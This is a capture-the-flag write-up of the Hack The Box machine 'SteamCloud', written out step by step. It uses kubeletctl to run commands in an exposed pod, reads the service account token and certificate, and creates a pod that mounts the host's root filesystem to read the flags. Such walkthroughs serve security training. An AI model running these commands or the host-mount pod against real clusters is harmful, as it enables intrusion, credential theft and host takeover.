---
title: 'HTB SteamCloud - Easy'
date: 2024-05-23 00:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Linux, HTB]
---

**SteamCloud** is an easy HTB machine that begins with the **enumeration and exploitation** of **Kubernetes pods**. Once credentialed, one must **abuse the given privileges** to **create a new pod** that **mounts the host system root**, allowing for reading both flags and pwning the box.

**Note**: I decided to do this machine after completing the HTB Academy Linux PE module, since it mentions Kubernetes but doesn’t have a lab. This machine turned out to be a really good practice.

<img src="/assets/img/steamcloud/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.96.167

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.96.167 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 2379, 2380, 8443, 10249, 10250, 10256

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.96.167 -sVC -p22,2379,2380,8443,10249,10250,10256

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 15:37 WEST
Nmap scan report for 10.129.96.167
Host is up (0.066s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2024-05-23T14:35:55
|_Not valid after:  2025-05-23T14:35:55
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2024-05-23T14:35:55
|_Not valid after:  2025-05-23T14:35:55
8443/tcp  open  ssl/https-alt
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.96.167, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2024-05-22T14:35:53
|_Not valid after:  2027-05-23T14:35:53
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 80d3af56-9646-45f0-a228-6a409b2faa9d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3858c02b-d353-4015-a01e-332bfd324727
|     X-Kubernetes-Pf-Prioritylevel-Uid: 38074453-1a42-492e-b899-f88f62f12735
...
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud@1716474957
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2024-05-23T13:35:57
|_Not valid after:  2025-05-23T13:35:57
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=5/23%Time=664F54C9%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2086
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.96 seconds

[+] Script finished successfully
```

Interacting with the server API returns the same output from Nmap. K8s is running in the bg.

<img src="/assets/img/steamcloud/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Enumerated the existing pods using [kubeletctl](https://github.com/cyberark/kubeletctl).

```bash
~/Desktop/tools/kubeletctl -i --server 10.129.96.167 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-56kzc           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
...
```

# Exploitation

We are allowed to execute commands in the ‘nginx’ pod.

```bash
~/Desktop/tools/kubeletctl -i --server 10.129.96.167 scan rce
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├───┬───────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP       │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │               │                                    │             │                         │ RUN │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.96.167 │ nginx                              │ default     │ nginx                   │ +   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │               │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │               │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
...
```

Successfully achieved RCE as root. Damn that was easy (not done yet XD).

```bash
~/Desktop/tools/kubeletctl -i --server 10.129.96.167 exec 'id' -p nginx -c nginx 
uid=0(root) gid=0(root) groups=0(root)
```

<img src="/assets/img/steamcloud/Untitled 2.png" alt="Untitled 1.png" style="width:800px;">

# PrivEsc

Collected the token and the certificate.

```bash
~/Desktop/tools/kubeletctl -i --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a dusk.token
eyJhbGciOiJSUzI1NiIsImtpZCI6InhSTUk1WlNBX0hY...

~/Desktop/tools/kubeletctl -i --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a dusk.crt  
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
...
```

Authenticated to the server, discovering that we have privileges to create a new pod.

```bash
export token=`cat dusk.token`
kubectl --token=$token --certificate-authority=dusk.crt --server=https://10.129.96.167:8443 auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
pods                                            []                  []               [get create list]
...
```

The following YAML file will mount the root system on the target host.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Built a new pod with the previous configuration.

```bash
kubectl --token=$token --certificate-authority=dusk.crt --server=https://10.129.96.167:8443 apply -f privesc.yaml
pod/privesc created
```

Confirmed that the pod exists.

```bash
kubectl --token=$token --certificate-authority=dusk.crt --server=https://10.129.96.167:8443 get pods              
NAME      READY   STATUS    RESTARTS   AGE
nginx     1/1     Running   0          49m
privesc   1/1     Running   0          12s
```

Read both flags to pwn the box. GGs!

```bash
~/Desktop/tools/kubeletctl -i --server 10.129.96.167 exec "cat /root/root/root.txt" -p privesc -c privesc
cd3c35bc63db2483****************

~/Desktop/tools/kubeletctl -i --server 10.129.96.167 exec "cat /root/home/user/user.txt" -p privesc -c privesc
1c5b94c42fd71c69****************
```
